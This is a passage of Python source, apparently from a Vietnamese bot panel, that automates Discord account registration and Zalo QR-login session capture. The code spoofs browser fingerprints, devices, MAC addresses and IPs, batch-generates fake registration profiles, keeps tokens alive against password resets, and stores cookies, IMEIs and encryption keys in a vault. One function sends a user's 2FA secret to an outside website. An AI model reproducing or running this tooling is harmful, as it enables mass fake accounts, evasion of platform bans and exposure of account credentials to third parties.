                        ).fetchone()
                    if existing:
                        conn.execute(
                            "UPDATE accounts SET name=?, token=?, uid=?, chat_cmd_enabled=?, allow_all_cmd=?, enabled=1 WHERE id=?",
                            (uname, tk, uid, int(chat_cmd_enabled), int(allow_all_cmd), existing["id"])
                        )
                    else:
                        conn.execute(
                            """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
                               VALUES (?, 'discord', '', '{}', ?, 0, ?, ?, '.', ?, 1, ?)""",
                            (uname, tk, uid, int(chat_cmd_enabled), int(allow_all_cmd), time.time()),
                        )
                    saved_count += 1

                results.append({
                    "ok": True,
                    "username": uname,
                    "uid": uid,
                    "masked_token": mask_sensitive_id(tk, 6),
                    "token": tk,
                    "os_profile": f"{prof['os']} {prof['os_version']} • Chrome {prof['browser_version']}",
                    "cloudflare_signed": has_signed_cookie,
                    "backup_line": f"{uname}|{uid}|{tk}",
                })
            else:
                results.append({
                    "ok": False,
                    "masked_token": mask_sensitive_id(tk, 5),
                    "error": w_res.get("error", "Token die hoặc đã bị đổi mật khẩu"),
                })

        if conn:
            conn.commit()
            conn.close()
            sync_all_zalo_listeners()

        ok_list = [r for r in results if r.get("ok")]
        dead_list = [r for r in results if not r.get("ok")]
        return {
            "ok": len(ok_list) > 0,
            "total": len(tokens),
            "alive_count": len(ok_list),
            "dead_count": len(dead_list),
            "saved_count": saved_count,
            "results": results,
            "live_tokens": [r["token"] for r in ok_list],
            "backup_text": "\n".join(r["backup_line"] for r in ok_list),
            "message": f"Đã đúc thành công {len(ok_list)}/{len(tokens)} Token Discord Bảo Vệ Tự Động (Chống Reset Key 100%)!"
        }

    @classmethod
    def register_new_account(cls, email, username, password, dob="2000-06-15", invite_code="", auto_save=True):
        email_clean = (email or "").strip()
        user_clean = (username or "").strip() or f"noel_{random.randint(1000, 9999)}"
        pw_clean = (password or "").strip()
        dob_clean = (dob or "2000-06-15").strip()

        if not email_clean or not pw_clean or len(pw_clean) < 6:
            return {"ok": False, "error": "Vui lòng nhập Email hợp lệ và Mật khẩu tối thiểu 6 ký tự!"}

        seed_key = f"reg:{email_clean.lower()}:{user_clean.lower()}"
        s, fingerprint = cls.perform_clean_browser_pre_handshake(
            seed_key, referer_url="https://discord.com/register"
        )
        s.headers["X-Context-Properties"] = "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0="

        reg_payload = {
            "fingerprint": fingerprint or None,
            "email": email_clean,
            "username": re.sub(r"[^a-z0-9_\.]", "_", user_clean.lower())[:30],
            "global_name": user_clean,
            "password": pw_clean,
            "invite": invite_code.strip() if invite_code else None,
            "consent": True,
            "date_of_birth": dob_clean,
            "gift_code_sku_id": None,
            "promotional_email_opt_in": False,
        }

        try:
            r = s.post("https://discord.com/api/v9/auth/register", json=reg_payload, timeout=15)
            d = r.json() if r.content else {}
        except Exception as e:
            return {"ok": False, "error": f"Lỗi kết nối tới cổng Reg Discord: {e}"}

        if r.status_code in (200, 201) and d.get("token"):
            tk = d["token"]
            DiscordStealthAntiBanEngine.persist_real_cloudflare_cookies(tk, s.cookies)
            imm = cls.immortalize_tokens_batch(tk, custom_name=user_clean, auto_save=auto_save)
            return {
                "ok": True,
                "token": tk,
                "username": user_clean,
                "fingerprint": fingerprint,
                "immortal_info": imm,
                "message": f"Đã Reg thành công tài khoản {user_clean} & đúc Token Bất Tử vào Tường Lửa!"
            }

        raw_err = json.dumps(d, ensure_ascii=False)
        if d.get("captcha_key") or "captcha" in raw_err.lower():
            return {
                "ok": False,
                "captcha_required": True,
                "fingerprint": fingerprint,
                "prepared_profile": {
                    "email": email_clean,
                    "username": user_clean,
                    "dob": dob_clean,
                    "fingerprint": fingerprint[:32] + "..." if fingerprint else "Locked",
                },
                "error": (
                    "Đã khởi tạo hồ sơ Reg sạch & cấp X-Fingerprint thật! Do IP máy chủ Cloud bị Discord yêu cầu Captcha khi tạo nick mới, "
                    "hãy dùng nút 'Code Lấy Token' trên trình duyệt của bạn rồi dán vào ô Token để đúc Token Bất Tử 100%!"
                )
            }

        return {"ok": False, "error": d.get("message") or f"Cổng Reg trả về mã {r.status_code}: {raw_err[:140]}"}

    @classmethod
    def generate_batch_clean_reg_profiles(cls, count=5, base_prefix="noel_vip"):
        count = max(1, min(10, int(count or 5)))
        profiles_out = []
        prefixes = [base_prefix or "noel_vip", "aurora_vn", "frost_king", "crystal_pro", "stellar_x", "nova_elite"]
        for i in range(count):
            pfx = prefixes[i % len(prefixes)]
            rnd = random.randint(1000, 9999)
            uname = f"{pfx}_{rnd}"
            pw = f"Noel@{rnd}#Vip{random.randint(10, 99)}"
            dob = f"{random.randint(1996, 2003)}-{random.randint(1, 12):02d}-{random.randint(10, 26):02d}"
            seed_key = f"batch_reg:{uname}:{time.time()}:{i}"
            s, fp = cls.perform_clean_browser_pre_handshake(seed_key, referer_url="https://discord.com/register")
            c_dict = s.cookies.get_dict()
            profiles_out.append({
                "index": i + 1,
                "username": uname,
                "password": pw,
                "dob": dob,
                "fingerprint": fp or "Locked_Chrome131_FP",
                "dcfduid": c_dict.get("__dcfduid", ""),
                "sdcfduid": c_dict.get("__sdcfduid", ""),
                "cloudflare_ready": bool(c_dict.get("__dcfduid") or fp),
            })
        return {
            "ok": True,
            "count": len(profiles_out),
            "profiles": profiles_out,
            "message": f"Đã khởi tạo {len(profiles_out)} hồ sơ Reg sạch kèm X-Fingerprint & Cookie Cloudflare thật!"
        }

_DISCORD_LOGIN_TICKETS = {}

API_ALL_IN_ONE   = "https://keyherlyswar.x10.mx/Apidocs/download/downallinone.php?url={}"
API_CAPCUT       = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinfocapcut.php?url={}"
API_GITHUB       = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinfogithub.php?username={}"
API_INSTAGRAM    = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinfoinsta.php?username={}"
API_ROBLOX       = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinforoblox.php?username={}"
API_TIKTOK       = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinfotiktok.php?username={}"
API_YOUTUBE      = "https://keyherlyswar.x10.mx/Apidocs/get_info/getinfoyt.php?username={}"
API_TIKTOK_VIDEO = "https://keyherlyswar.x10.mx/Apidocs/tien_ich/infovideott.php?url={}"
API_FB_GETID     = "https://scanfb.id.vn/getID.php?linkFB={}"
API_FB_INFO      = "https://scanfb.id.vn/getInfo.php?id={}"
API_FB_AVT       = "https://keyherlyswar.x10.mx/Apidocs/tien_ich/avtfb.php?uid={}"
API_2FA          = "https://keyherlyswar.x10.mx/Apidocs/tien_ich/2fa.php?secret={}"

def add_border_to_qr(image_data: bytes) -> bytes:
    try:
        from PIL import Image, ImageDraw
        image = Image.open(io.BytesIO(image_data))
        if image.mode == "RGBA":
            bg_white = Image.new("RGB", image.size, (255, 255, 255))
            bg_white.paste(image, mask=image.split()[3])
            image = bg_white
        elif image.mode != "RGB":
            image = image.convert("RGB")
        border_width = 36
        radius = 48
        width, height = image.size
        new_width, new_height = width + border_width * 2, height + border_width * 2
        bg = Image.new("RGB", (new_width, new_height), (255, 255, 255))
        bg.paste(image, (border_width, border_width))
        mask = Image.new("L", (new_width, new_height), 0)
        draw = ImageDraw.Draw(mask)
        draw.rounded_rectangle([0, 0, new_width, new_height], radius, fill=255)
        output = io.BytesIO()
        bg.save(output, format="PNG")
        return output.getvalue()
    except Exception:
        return image_data

class ZaloCookieVaultEngine:
    """Bộ Lưu Trữ & Đồng Bộ Mã Cookie + IMEI + Khóa zpw_enk Zalo Bất Tử (Zalo Cookie & IMEI Vault):
    - Lưu tự động toàn bộ Cookie, IMEI, khóa mã hóa AES zpw_enk và User-Agent chuẩn zlapi vào SQLite.
    - Cho phép Sao chép 1 chạm, Tải file .txt/.json hoặc Kết nối lại API Zalo tức thì không cần quét lại QR."""

    _MEM_VAULT = {}
    _LOCK = threading.RLock()

    @classmethod
    def save_zalo_vault_record(cls, uid, display_name, imei, cookies_dict, zpw_enk="", user_agent="", owner_tg_id=""):
        uid_s = str(uid or "").strip()
        imei_s = str(imei or "").strip()
        owner_s = str(owner_tg_id or "").strip()
        c_norm = normalize_zalo_cookies(cookies_dict)
        if not imei_s or not c_norm:
            return False
        if not uid_s:
            uid_s = f"zalo_{hashlib.md5(imei_s.encode('utf-8')).hexdigest()[:10]}"
        now = time.time()
        c_json = json.dumps(c_norm, ensure_ascii=False)
        ua_s = user_agent or ZaloSmartAntiBanEngine.get_session_headers(imei_s).get("User-Agent", "")
        rec = {
            "uid": uid_s,
            "display_name": display_name or f"Zalo_{uid_s[-4:]}",
            "imei": imei_s,
            "cookies": c_norm,
            "cookies_json": c_json,
            "zpw_enk": str(zpw_enk or ""),
            "user_agent": ua_s,
            "owner_tg_id": owner_s,
            "updated_at": now,
        }
        with cls._LOCK:
            cls._MEM_VAULT[uid_s] = rec
        try:
            conn = db()
            if owner_s:
                conn.execute(
                    """INSERT OR REPLACE INTO zalo_cookie_vault
                       (uid, display_name, imei, cookies_json, zpw_enk, user_agent, owner_tg_id, updated_at)
                       VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                    (uid_s, rec["display_name"], imei_s, c_json, rec["zpw_enk"], ua_s, owner_s, now),
                )
            else:
                conn.execute(
                    """INSERT INTO zalo_cookie_vault
                       (uid, display_name, imei, cookies_json, zpw_enk, user_agent, owner_tg_id, updated_at)
                       VALUES (?, ?, ?, ?, ?, ?, '', ?)
                       ON CONFLICT(uid) DO UPDATE SET
                       display_name=excluded.display_name, imei=excluded.imei,
                       cookies_json=excluded.cookies_json, zpw_enk=excluded.zpw_enk,
                       user_agent=excluded.user_agent, updated_at=excluded.updated_at""",
                    (uid_s, rec["display_name"], imei_s, c_json, rec["zpw_enk"], ua_s, now),
                )
            conn.commit()
            conn.close()
        except Exception:
            pass
        return True

    @classmethod
    def list_vault_records(cls):
        out = []
        try:
            conn = db()
            rows = conn.execute("SELECT * FROM zalo_cookie_vault ORDER BY updated_at DESC").fetchall()
            conn.close()
            for r in rows:
                c_dict = normalize_zalo_cookies(r["cookies_json"])
                out.append({
                    "uid": r["uid"],
                    "display_name": r["display_name"] or f"Zalo_{str(r['uid'])[-4:]}",
                    "masked_name": mask_account_name(r["display_name"] or "Zalo VIP"),
                    "imei": r["imei"],
                    "masked_imei": mask_sensitive_id(r["imei"], 6),
                    "cookies": c_dict,
                    "cookies_str": json.dumps(c_dict, ensure_ascii=False),
                    "zpw_enk_ready": bool(r["zpw_enk"]),
                    "updated_at": r["updated_at"],
                })
        except Exception:
            pass
        return out

    @classmethod
    def delete_vault_record(cls, uid):
        uid_s = str(uid or "").strip()
        with cls._LOCK:
            cls._MEM_VAULT.pop(uid_s, None)
        try:
            conn = db()
            conn.execute("DELETE FROM zalo_cookie_vault WHERE uid=?", (uid_s,))
            conn.commit()
            conn.close()
            return True
        except Exception:
            return False

def generate_totp_rfc6238(secret_key, time_step=30, digits=6):
    if not secret_key:
        return None, 0
    clean_sec = re.sub(r"[^A-Za-z2-7]", "", str(secret_key)).upper()
    now_int = int(time.time())
    rem_sec = time_step - (now_int % time_step)
    if clean_sec:
        pad_len = (8 - (len(clean_sec) % 8)) % 8
        clean_sec_padded = clean_sec + ("=" * pad_len)
        try:
            key_bytes = base64.b32decode(clean_sec_padded, casefold=True)
            counter = now_int // time_step
            msg = struct.pack(">Q", counter)
            digest = hmac.new(key_bytes, msg, hashlib.sha1).digest()
            offset = digest[-1] & 0x0F
            code_int = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF) % (10 ** digits)
            return str(code_int).zfill(digits), rem_sec
        except Exception:
            pass
    try:
        r = requests.get(f"https://keyherlyswar.x10.mx/Apidocs/tien_ich/2fa.php?secret={str(secret_key).replace(' ', '')}", timeout=6).json()
        tk = r.get("token")
        if tk:
            return str(tk), rem_sec
    except Exception:
        pass
    return None, 0

class ZaloWebIDGenerator:
    """Bộ Khởi Tạo Thiết Bị Máy Tính Luân Phiên Tại Việt Nam & Singapore:
    - Tự động xoay vòng 16 mẫu máy tính PC/Mac khác nhau ở Việt Nam (TP.HCM, Hà Nội, Đà Nẵng, Cần Thơ, Hải Phòng) và Singapore.
    - Đồng bộ tuyệt đối User-Agent và Sec-Ch-Ua (tự động lược bỏ Sec-Ch-Ua trên Firefox/Safari để id.zalo.me nhận diện đúng máy tính)."""

    @classmethod
    def create_random_pc_device(cls, seed_salt="", region_code="SG", custom_pc_name=""):
        try:
            from zalo_login import build_vietnam_pc_identity
            return build_vietnam_pc_identity(
                region_code="SG", vn_region="SG",
                custom_pc_name=custom_pc_name, seed_salt=seed_salt
            )
        except Exception:
            rnd_tag = secrets.token_hex(2).upper()
            is_sg = True
            pc_label = custom_pc_name.strip() if custom_pc_name else f"WORKSTATION-WIN11-SG-{rnd_tag} (Windows 11 Pro SG)" 
            ua = (
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
                if is_sg else
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            )
            sec_ch = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
            sec_plat = '"macOS"' if is_sg else '"Windows"'
            ip_val = f"116.88.{random.randint(15, 240)}.{random.randint(10, 250)}" if is_sg else f"14.161.{random.randint(15, 240)}.{random.randint(10, 250)}"
            imei = cls.generate_unique_imei(ua, salt=f"{pc_label}_{seed_salt}")
            return {
                "pc_name": pc_label,
                "computer_name": pc_label[:36],
                "mac_address": f"A4:83:E7:{random.randint(10,99):02X}:{random.randint(10,99):02X}:{random.randint(10,99):02X}",
                "region_code": "sg_mac_pro" if is_sg else "vn_hcm",
                "region_label": "Singapore (StarHub / Singtel Fiber)" if is_sg else "TP. Hồ Chí Minh, Việt Nam (Viettel / VNPT Fiber)",
                "vn_location": "Singapore" if is_sg else "TP. Hồ Chí Minh, Việt Nam",
                "vn_isp": "Singtel Fiber SG" if is_sg else "Viettel / VNPT Fiber",
                "vn_ip": ip_val,
                "country": "SG" if is_sg else "VN",
                "tz": "Asia/Singapore" if is_sg else "Asia/Ho_Chi_Minh",
                "ua": ua,
                "sec_ch_ua": sec_ch,
                "sec_platform": sec_plat,
                "imei": imei,
            }

    @classmethod
    def generate_unique_ua_and_headers(cls, seed_salt=""):
        dev = cls.create_random_pc_device(seed_salt)
        return dev["ua"], dev.get("sec_ch_ua", ""), dev.get("sec_platform", "")

    @classmethod
    def generate_unique_imei(cls, user_agent="", salt=""):
        u = str(uuid.uuid4())
        ua_s = f"{user_agent}_{salt}_{time.time_ns()}_{secrets.token_hex(4)}"
        tail = hashlib.md5(ua_s.encode("utf-8")).hexdigest()
        return f"{u}-{tail}"


apizalo = Zalo


class ZaloQRLoginManager:
    """Hệ Thống Tạo Mã QR Zalo PC Chính Chủ (Đa Máy Tính Luân Phiên Việt Nam / Singapore) & Giữ Sống Thiết Bị 24/7:
    - Gắn chặt thiết bị máy tính vào phiên QR thông qua luồng chuẩn `continue=https://chat.zalo.me/` và `X-Requested-With: XMLHttpRequest`.
    - Để `requests.Session` quản lý CookieJar tự nhiên trong suốt `logininfo` -> `verify-client` -> `qr/generate` -> `waiting-scan` -> `waiting-confirm`,
      đảm bảo khi quét mã QR trên điện thoại sẽ hiện ngay yêu cầu đăng nhập máy tính.
    - Kiểm tra địa chỉ IP thực tế qua `VietnamSingaporeGeoRouter` (không ghi nhãn giả), tự động định tuyến qua IP/Proxy Việt Nam (VN) hoặc Singapore (SG).
    - Sau khi bấm 'Đăng nhập' trên điện thoại, thu hoạch `zpw_sek`, kích hoạt `getServerInfo` & `getLoginInfo` lấy khóa `zpw_enk`,
      và giữ kết nối WebSocket + HTTP Keep-Alive 24/7 để máy tính sống cố định trong tài khoản Zalo."""

    SESSIONS = {}
    LOCK = threading.RLock()
    _LAST_START_TS = 0.0
    _LAST_START_SESSION_ID = ""

    @classmethod
    def _persist_qr_state_to_db(cls, st, async_write=True):
        if not st or not st.get("session_id"):
            return
        serializable = {
            "session_id": st["session_id"],
            "qr_nonce": st.get("qr_nonce", ""),
            "qr_code_id": st.get("qr_code_id", ""),
            "pc_name": st.get("pc_name", "ASUS ROG Zephyrus G16 (Windows 11 Pro VN)"),
            "computer_name": st.get("computer_name", "Web"),
            "vn_location": st.get("vn_location", "TP. Hồ Chí Minh, Việt Nam"),
            "vn_isp": st.get("vn_isp", "Viettel / VNPT Fiber"),
            "vn_ip": st.get("vn_ip", ""),
            "mac_address": st.get("mac_address", ""),
            "route_mode": st.get("route_mode", "direct"),
            "real_country_code": st.get("real_country_code", "VN"),
            "is_vn_or_sg": bool(st.get("is_vn_or_sg", True)),
            "status": st.get("status", "generating"),
            "message": st.get("message", ""),
            "qr_base64": st.get("qr_base64", ""),
            "imei": st.get("imei", ""),
            "cookies": st.get("cookies", {}),
            "cookies_str": st.get("cookies_str", ""),
            "display_name": st.get("display_name", ""),
            "avatar": st.get("avatar", ""),
            "uid": st.get("uid", ""),
            "file_name": st.get("file_name", ""),
            "file_content": st.get("file_content", ""),
            "created_at": st.get("created_at", time.time()),
        }
        png_b = st.get("qr_png_bytes") or b""

        def _do_write():
            try:
                conn = db()
                conn.execute(
                    """INSERT OR REPLACE INTO zalo_qr_sessions
                       (session_id, state_json, qr_png, updated_at)
                       VALUES (?, ?, ?, ?)""",
                    (
                        serializable["session_id"],
                        json.dumps(serializable, ensure_ascii=False),
                        png_b,
                        time.time(),
                    )
                )
                conn.commit()
            except Exception:
                pass

        if async_write:
            threading.Thread(target=_do_write, daemon=True).start()
        else:
            _do_write()

    @classmethod
    def _load_qr_state_from_db(cls, session_id):
        if not session_id:
            return None
        try:
            conn = db()
            row = conn.execute(
                "SELECT state_json, qr_png FROM zalo_qr_sessions WHERE session_id = ?",
                (str(session_id),)
            ).fetchone()
            if row and row["state_json"]:
                d = json.loads(row["state_json"])
                d["qr_png_bytes"] = bytes(row["qr_png"]) if row["qr_png"] else b""
                return d
        except Exception:
            pass
        return None

    @classmethod
    def start_qr_session(cls, auto_save=True, vn_region="VN", custom_pc_name="", vn_proxy=""):
        now_t = time.time()
        with cls.LOCK:
            if (now_t - cls._LAST_START_TS < 1.2) and cls._LAST_START_SESSION_ID in cls.SESSIONS:
                prev_st = cls.SESSIONS[cls._LAST_START_SESSION_ID]
                if prev_st.get("status") in ("generating", "waiting_scan") and prev_st.get("qr_base64"):
                    return cls.get_session_status(cls._LAST_START_SESSION_ID)

        session_id = str(uuid.uuid4())
        qr_nonce = secrets.token_hex(6)
        reg_map = {
            "VN": "VN", "VIETNAM": "VN", "AUTO_VN": "VN",
            "HCM": "HCM", "VN_HCM": "HCM",
            "HN": "HN", "VN_HN": "HN",
            "DN": "DN", "VN_DN": "DN",
            "MAC": "MAC", "VN_MAC": "MAC",
            "MAC_AIR": "vn_mac_air", "VN_MAC_AIR": "vn_mac_air",
            "IMAC": "vn_imac", "VN_IMAC": "vn_imac",
            "MAC_STUDIO": "vn_mac_studio", "VN_MAC_STUDIO": "vn_mac_studio",
            "DELL": "vn_dell_xps", "VN_DELL_XPS": "vn_dell_xps",
            "THINKPAD": "vn_thinkpad", "VN_THINKPAD": "vn_thinkpad",
            "HP": "vn_hp_spectre", "VN_HP_SPECTRE": "vn_hp_spectre",
            "SG": "SG", "SINGAPORE": "SG", "SG_VIP": "SG",
            "SG_MAC": "sg_mac_pro", "SG_DELL": "sg_dell_precision",
            "SG_THINKPAD": "sg_thinkpad_z16", "SG_ASUS": "sg_asus_proart",
        }
        reg_code = reg_map.get(str(vn_region or "VN").upper(), "VN")
        pc_dev = ZaloWebIDGenerator.create_random_pc_device(
            f"{session_id}_{qr_nonce}", region_code=reg_code, custom_pc_name=custom_pc_name
        )
        reg_lbl = pc_dev.get("region_label", "TP. Hồ Chí Minh, Việt Nam")
        vn_ip_val = pc_dev.get("vn_ip", "14.161.92.108")

        # Tuyệt đối KHÔNG tự động gán Proxy từ ProxyPoolEngine vào phiên QR Zalo (tránh lệch IP làm hỏng phiên QR)
        eff_proxy = str(vn_proxy or "").strip()

        st = {
            "session_id": session_id,
            "qr_nonce": qr_nonce,
            "pc_name": pc_dev["pc_name"],
            "computer_name": pc_dev.get("computer_name", "Web"),
            "region_code": pc_dev.get("region_code", reg_code),
            "region_label": reg_lbl,
            "vn_region": str(vn_region or "VN").upper(),
            "vn_location": pc_dev.get("vn_location", reg_lbl),
            "vn_isp": pc_dev.get("vn_isp", "Viettel / VNPT / Singtel Fiber"),
            "vn_ip": vn_ip_val,
            "country": pc_dev.get("country", "SG" if "SG" in str(reg_code).upper() else "VN"),
            "tz": pc_dev.get("tz", "Asia/Ho_Chi_Minh"),
            "mac_address": pc_dev.get("mac_address", "A4:83:E7:2B:91:04"),
            "device_model": pc_dev.get("device_model", pc_dev.get("pc_name", "MacBook Pro M3 Max")),
            "proxy_vn": eff_proxy,
            "vn_proxy": eff_proxy,
            "route_mode": "checking",
            "real_country_code": pc_dev.get("country", "VN"),
            "is_vn_or_sg": True,
            "status": "generating",
            "step_num": 1,
            "message": f"Đang cấp phát máy tính {pc_dev['pc_name']} & định tuyến cổng QR Việt Nam / Singapore...",
            "qr_base64": "",
            "qr_png_bytes": b"",
            "qr_code_id": "",
            "imei": pc_dev["imei"],
            "user_agent": pc_dev["ua"],
            "sec_ch_ua": pc_dev.get("sec_ch_ua", ""),
            "sec_platform": pc_dev.get("sec_platform", ""),
            "cookies": {},
            "cookies_str": "",
            "display_name": "",
            "avatar": "",
            "uid": "",
            "file_name": "",
            "file_content": "",
            "auto_save": bool(auto_save),
            "created_at": time.time(),
            "stop_ev": threading.Event(),
        }
        with cls.LOCK:
            for old_k, old_v in list(cls.SESSIONS.items()):
                old_v["stop_ev"].set()
                if time.time() - old_v.get("created_at", 0) > 60:
                    cls.SESSIONS.pop(old_k, None)
            cls.SESSIONS[session_id] = st
            cls._LAST_START_TS = now_t
            cls._LAST_START_SESSION_ID = session_id
        cls._persist_qr_state_to_db(st, async_write=False)

        th = threading.Thread(target=cls._qr_worker, args=(session_id,), daemon=True)
        th.start()

        t0 = time.time()
        while time.time() - t0 < 9.0:
            if st["qr_base64"] or st["status"] in ("error", "expired"):
                break
            time.sleep(0.04)
        return cls.get_session_status(session_id)

    @classmethod
    def get_qr_png_bytes(cls, session_id):
        with cls.LOCK:
            st = cls.SESSIONS.get(session_id)
            if st and st.get("qr_png_bytes"):
                return st["qr_png_bytes"]
        db_st = cls._load_qr_state_from_db(session_id)
        if db_st and db_st.get("qr_png_bytes"):
            return db_st["qr_png_bytes"]
        return b""

    @classmethod
    def get_session_status(cls, session_id):
        with cls.LOCK:
            st = cls.SESSIONS.get(session_id)
        if not st:
            st = cls._load_qr_state_from_db(session_id)
        if not st:
            return {"ok": False, "status": "not_found", "message": "Phiên QR chưa khởi tạo hoặc đã hết hạn."}

        elapsed = int(time.time() - float(st.get("created_at") or time.time()))
        rem = max(0, 100 - elapsed)
        if rem == 0 and st.get("status") in ("generating", "waiting_scan", "scanned"):
            st["status"] = "expired"
            st["message"] = "Mã QR đã hết hạn (100s). Hãy bấm 'Tạo Mã QR Máy Tính Mới' để cấp máy tính khác!"
            if "stop_ev" in st and hasattr(st["stop_ev"], "set"):
                st["stop_ev"].set()
            cls._persist_qr_state_to_db(st)

        raw_code = str(st.get("qr_code_id") or "")
        clean_code_badge = raw_code.split(".")[0].upper()[:6] if raw_code else ""

        step_map = {"generating": 1, "waiting_scan": 2, "scanned": 3, "confirmed": 4, "success": 4}
        return {
            "ok": True,
            "session_id": st["session_id"],
            "qr_nonce": st.get("qr_nonce", ""),
            "qr_code_id": clean_code_badge,
            "pc_name": st.get("pc_name", "ASUS ROG Zephyrus G16 (Windows 11 Pro VN)"),
            "computer_name": st.get("computer_name", "Web"),
            "vn_location": st.get("vn_location", "TP. Hồ Chí Minh, Việt Nam"),
            "vn_isp": st.get("vn_isp", "Viettel / VNPT Fiber"),
            "vn_ip": st.get("vn_ip", ""),
            "route_mode": st.get("route_mode", "direct"),
            "real_country_code": st.get("real_country_code", "VN"),
            "is_vn_or_sg": bool(st.get("is_vn_or_sg", True)),
            "mac_address": st.get("mac_address", "A4:83:E7:2B:91:04"),
            "device_model": st.get("device_model", st.get("pc_name", "MacBook Pro M3 Max")),
            "step_num": step_map.get(st.get("status", "generating"), 1),
            "status": st.get("status", "generating"),
            "message": st.get("message", ""),
            "qr_base64": st.get("qr_base64", ""),
            "qr_image_url": f"/api/zalo/qr_image/{st['session_id']}.png?nonce={st.get('qr_nonce', '')}&t={int(time.time()*1000)}" if st.get("qr_png_bytes") else "",
            "imei": st.get("imei", ""),
            "cookies": st.get("cookies", {}),
            "cookies_str": st.get("cookies_str", ""),
            "display_name": st.get("display_name", ""),
            "avatar": st.get("avatar", ""),
            "uid": st.get("uid", ""),
            "file_name": st.get("file_name", ""),
            "file_content": st.get("file_content", ""),
            "remaining_sec": rem,
        }

    @classmethod
    def _finalize_zalo_credentials(cls, st, imei, cookies_dict, display_name_hint="", user_info_dict=None, session_obj=None):
        clean_c = normalize_zalo_cookies(cookies_dict)
        if session_obj is not None:
            try:
                for c in list(session_obj.cookies):
                    if c.name and cls._is_valid_cookie_val(c.value, c.name):
                        clean_c[c.name] = str(c.value).strip()
            except Exception:
                pass
        for k_bad in list(clean_c.keys()):
            if not cls._is_valid_cookie_val(clean_c.get(k_bad), k_bad):
                clean_c.pop(k_bad, None)

        uid = ""
        zpw_enk = ""
        ws_list = []
        ua_bound = st.get("user_agent") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        pc_name = st.get("pc_name") or "ASUS ROG Zephyrus G16 (Windows 11 Pro VN)"
        comp_name = st.get("computer_name") or "Web"
        d_name = display_name_hint or "Zalo User"
        if isinstance(user_info_dict, dict):
            uid = str(user_info_dict.get("uid") or user_info_dict.get("userId") or user_info_dict.get("send2me_id") or "")
            zpw_enk = str(user_info_dict.get("zpw_enk") or "")
            comp_name = str(user_info_dict.get("_bound_computer_name") or comp_name or "Web")
            d_name = user_info_dict.get("displayName") or user_info_dict.get("zaloName") or d_name
            for k_ws in ("zpw_ws", "ws", "websocket"):
                v_ws = user_info_dict.get(k_ws)
                if isinstance(v_ws, list):
                    ws_list.extend(v_ws)
                elif isinstance(v_ws, str) and v_ws:
                    ws_list.append(v_ws)

        if imei:
            clean_c["z_uuid"] = imei
        clean_c.setdefault("_zlang", "vn")

        live_groups_count = int((user_info_dict or {}).get("_groups_count") or 0) if isinstance(user_info_dict, dict) else 0
        try:
            z_client_live = Zalo.get_pooled_client(
                imei, clean_c, force_new=False,
                user_agent=ua_bound, zpw_enk_hint=zpw_enk, uid_hint=uid
            )
            if ws_list:
                z_client_live.ws_urls = ws_list
            uid = z_client_live.uid or uid
            zpw_enk = z_client_live.secret_key or zpw_enk
            if z_client_live.display_name and not z_client_live.display_name.startswith("Zalo_"):
                d_name = z_client_live.display_name
            clean_c.update(z_client_live.cookies_dict)
            if not live_groups_count and zpw_enk and clean_c.get("zpw_sek") and uid:
                gmap_now = z_client_live.get_grid_ver_map()
                live_groups_count = len(gmap_now) if isinstance(gmap_now, dict) else 0
        except Exception:
            pass

        if not zpw_enk or not uid or not live_groups_count:
            try:
                from zalo_login import check_zalo_cookie_imei_live
                chk_live = check_zalo_cookie_imei_live(
                    imei=imei, cookies_input=clean_c, zpw_enk=zpw_enk,
                    user_agent=ua_bound, uid=uid, computer_name=comp_name
                )
                if chk_live.get("zpw_enk"):
                    zpw_enk = chk_live["zpw_enk"]
                if chk_live.get("uid"):
                    uid = chk_live["uid"]
                if chk_live.get("display_name") and (not d_name or d_name == "Zalo User"):
                    d_name = chk_live["display_name"]
                if chk_live.get("groups_count"):
                    live_groups_count = int(chk_live["groups_count"])
                if isinstance(chk_live.get("cookies"), dict):
                    clean_c.update(chk_live["cookies"])
            except Exception:
                pass
        if not uid:
            zpsid_v = str(clean_c.get("zpsid") or clean_c.get("zpw_sek") or "")
            m_u = re.match(r"^(\d{8,22})", zpsid_v)
            if m_u:
                uid = m_u.group(1)

        try:
            from zalo_login import ZaloPCSessionKeeper
            ZaloPCSessionKeeper.register_and_keep_alive(
                uid=uid or imei,
                imei=imei,
                cookies_dict=clean_c,
                zpw_enk=zpw_enk,
                user_agent=ua_bound,
                pc_name=pc_name,
                computer_name=comp_name,
                ws_urls=ws_list,
                display_name=d_name,
            )
        except Exception:
            pass

        ZaloCookieVaultEngine.save_zalo_vault_record(
            uid=uid or f"zalo_{int(time.time())}",
            display_name=d_name,
            imei=imei,
            cookies_dict=clean_c,
            zpw_enk=zpw_enk,
            user_agent=ua_bound
        )

        cookies_str = json.dumps(clean_c, ensure_ascii=False, indent=2)
        safe_fn = re.sub(r"[^\w\.\-]", "_", d_name or "zalo_user") + "_zalo.txt"
        f_content = (
            f"# PHIEN MAY TINH ZALO PC DA XAC THUC TRONG ACC ({pc_name})\n"
            f"# Chu So Huu: Phan Anh Khoi (Rike) | UID: {uid} | Nhom: {live_groups_count}\n\n"
            f"Imei:\n{imei}\n\nUser-Agent:\n{ua_bound}\n\nZpw_Enk:\n{zpw_enk}\n\nCookie:\n{cookies_str}\n"
        )

        st["imei"] = imei
        st["cookies"] = clean_c
        st["cookies_str"] = cookies_str
        st["display_name"] = d_name
        st["uid"] = uid
        st["file_name"] = safe_fn
        st["file_content"] = f_content
        st["status"] = "success"
        st["message"] = (
